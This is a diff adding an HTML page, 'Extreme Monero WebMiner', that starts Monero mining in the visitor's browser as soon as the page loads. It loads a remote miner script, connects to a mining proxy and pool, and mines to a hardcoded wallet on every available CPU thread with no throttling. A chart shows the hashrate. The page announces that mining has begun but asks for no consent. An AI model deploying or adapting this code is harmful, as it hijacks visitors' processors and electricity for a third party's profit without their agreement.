@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Extreme Monero WebMiner</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+    }
+    #hashrate, #total {
+      font-size: 1.5em;
+      margin-top: 20px;
+    }
+    canvas {
+      margin-top: 30px;
+      background: #111;
+      border: 1px solid lime;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔥 Monero Miner Active</h1>
+  <p>CPU mining has started at maximum capacity.</p>
+  <p>Do not close this tab for maximum efficiency.</p>
+  <div id="hashrate">Hashrate: calculating...</div>
+  <div id="total">Total Hashes: 0</div>
+  <canvas id="chart" width="400" height="200"></canvas>
+
+  <!-- EXTREME MINER SCRIPT -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+  <script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "gulf.moneroocean.stream:10004";
+    var walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+    var workerId = "ExtremeWebMiner";
+    var threads = navigator.hardwareConcurrency || -1;
+    var throttleMiner = 0;
+
+    startMining(pool, walletAddress, workerId, threads, "");
+    throttleMiner = 0;
+    stopOnError = false;
+    debug = true;
+
+    // Chart.js setup
+    const ctx = document.getElementById('chart').getContext('2d');
+    const data = {
+      labels: [],
+      datasets: [{
+        label: 'Hashrate (H/s)',
+        data: [],
+        borderColor: 'lime',
+        borderWidth: 1,
+        pointRadius: 0,
+        fill: false,
+        tension: 0.1
+      }]
+    };
+    const config = {
+      type: 'line',
+      data: data,
+      options: {
+        animation: false,
+        scales: {
+          x: { display: false },
+          y: {
+            beginAtZero: true,
+            ticks: { color: 'lime' },
+            grid: { color: '#333' }
+          }
+        },
+        plugins: {
+          legend: { labels: { color: 'lime' } }
+        }
+      }
+    };
+    const chart = new Chart(ctx, config);
+
+    // Update stats and chart
+    setInterval(function () {
+      if (typeof getHashRate === 'function') {
+        var hashrate = getHashRate().toFixed(2);
+        document.getElementById("hashrate").textContent = "Hashrate: " + hashrate + " H/s";
+
+        // Add to chart
+        const now = new Date().toLocaleTimeString();
+        if (data.labels.length > 30) {
+          data.labels.shift();
+          data.datasets[0].data.shift();
+        }
+        data.labels.push(now);
+        data.datasets[0].data.push(hashrate);
+        chart.update();
+      }
+      if (typeof getTotalHashes === 'function') {
+        document.getElementById("total").textContent = "Total Hashes: " + getTotalHashes();
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
